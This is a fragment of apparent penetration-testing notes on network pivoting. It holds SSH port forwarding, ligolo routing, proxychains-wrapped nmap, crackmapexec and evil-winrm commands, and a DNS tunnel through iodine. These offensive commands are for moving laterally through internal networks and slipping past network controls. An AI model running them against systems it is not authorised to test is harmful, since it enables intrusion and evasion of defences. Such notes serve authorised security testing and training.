...
ssh -L 8080:REDACTED_INTERNAL_IP:80 user@PIVOT -N
...
sudo ip route add REDACTED_INTERNAL_IP/24 dev ligolo
sudo ip route add REDACTED_INTERNAL_IP/16 dev ligolo
```
...
sudo ip route add REDACTED_INTERNAL_IP/24 dev ligolo    # via agent 1
sudo ip route add REDACTED_INTERNAL_IP/24 dev ligolo  # via agent 2
```
...
```bash
# Usage
proxychains nmap -sT -Pn -p 22,80,445 REDACTED_INTERNAL_IP/24
proxychains crackmapexec smb REDACTED_INTERNAL_IP/24
proxychains evil-winrm -i REDACTED_INTERNAL_IP -u admin -p pass
```
...
iodined -f -c -P password REDACTED_INTERNAL_IP t1.yourdomain.com
